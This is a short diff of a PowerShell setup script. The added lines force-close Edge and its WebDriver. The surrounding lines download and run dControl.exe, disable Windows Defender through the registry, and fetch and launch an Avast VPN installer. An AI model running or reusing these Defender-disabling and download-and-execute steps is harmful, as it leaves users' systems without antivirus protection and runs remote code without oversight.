@@ -22,6 +22,8 @@ $extractPath = "$env:USERPROFILE\Desktop"
 Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
 Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force
 Start-Process -FilePath "$extractPath\dControl.exe"
+Stop-Process -Name msedgedriver -Force
+Stop-Process -Name msedge -Force
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -Force
 Invoke-WebRequest -Uri "https://bits.avcdn.net/productfamily_VPN/insttype_PRO/platform_WIN/installertype_ONLINE/build_RELEASE/cookie_mmm_scl_998_999_000_m:dlid_SLN-TRIAL-ONLINE-PP?alt=en-us" -OutFile "$env:USERPROFILE\Desktop\avast.exe"
 Start-Process -FilePath "$extractPath\avast.exe"
